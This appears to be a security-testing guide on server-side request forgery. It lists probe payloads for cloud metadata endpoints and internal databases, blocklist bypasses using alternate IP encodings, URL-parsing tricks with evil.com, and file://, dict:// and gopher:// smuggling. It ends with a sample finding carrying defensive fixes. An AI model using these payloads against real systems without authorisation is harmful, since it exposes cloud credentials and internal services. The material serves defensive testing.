# Server-Side Request Forgery (SSRF)

Test whether the application can be tricked into making requests to internal
resources it should not have access to.

## Probe Patterns

### Basic SSRF

Any endpoint that accepts a URL, host, or IP and fetches it server-side:

```http
POST /api/fetch
{"url": "http://169.254.169.254/latest/meta-data/"}       # AWS metadata
{"url": "http://metadata.google.internal/computeMetadata/"} # GCP metadata
{"url": "http://100.100.100.200/latest/meta-data/"}        # Alibaba Cloud
{"url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01"} # Azure
```

### Internal Network Probing

```http
{"url": "http://localhost:6379"}         # Redis
{"url": "http://localhost:9200"}         # Elasticsearch
{"url": "http://localhost:27017"}        # MongoDB
{"url": "http://localhost:3000"}         # Internal app
{"url": "http://10.0.0.1:22"}           # SSH on internal network
{"url": "http://192.168.1.1:8080"}      # Internal router
{"url": "http://127.0.0.1:5432"}        # PostgreSQL
```

### Bypass Techniques

Try these when there is a blocklist or allowlist:

```text
# DNS rebinding friendly
http://localhost/
http://127.0.0.1/
http://0.0.0.0/
http://[::1]/

# Alternative representations
http://2130706433/              # 127.0.0.1 as decimal
http://0x7f000001/              # 127.0.0.1 as hex
http://0177.0.0.1/              # 127.0.0.1 as octal
http://127.1/                   # Short form

# URL parsing tricks
http://evil.com@127.0.0.1       # Credentials in URL
http://127.0.0.1:80@evil.com    # Port confusion
http://evil.com#@127.0.0.1      # Fragment tricks

# DNS-based
http://1e100.net/               # Google IP range
http://internal.app/            # Internal DNS name
http://metadata/                # If DNS resolves to metadata IP

# Redirect-based SSRF
http://evil.com/redirect?target=http://169.254.169.254/

# Protocol smuggling
file:///etc/passwd
dict://localhost:6379/info
gopher://localhost:6379/_*2%0d%0a...
```

### Blind SSRF

Even without seeing the response, check for side effects:

- DNS lookups to your controlled domain (Canarytokens, Burp Collaborator)
- Timing differences (internal services respond faster/slower)
- Error messages that reveal internal IPs
- Outbound connections visible in logs (if you have access)

## Finding Format Example

```yaml
id: RT-035
title: SSRF in /api/fetch — can access AWS metadata endpoint
category: SSRF
severity: Critical
cwe: CWE-918
blast_radius: Full cloud metadata access → IAM credentials → account compromise
location: src/routes/proxy.ts:22
detection_difficulty: Easy
confidence: High
kev_listed: false
epss_score: null
functional_requirements:
  - URL fetch endpoint MUST validate against an allowlist of permitted domains
  - Endpoint MUST block RFC 1918 private IP ranges and link-local addresses
  - Endpoint MUST NOT follow redirects to internal addresses
non_functional_requirements:
  - URL validation must use proper URL parsing, not string matching
  - Use a dedicated HTTP client with restricted redirect policy
  - Log all outbound requests for audit
acceptance_criteria:
  - POST /api/fetch {"url": "http://169.254.169.254/"} returns 400
  - POST /api/fetch {"url": "http://127.0.0.1:9200"} returns 400
  - POST /api/fetch {"url": "https://allowed-domain.com/data"} returns 200
```
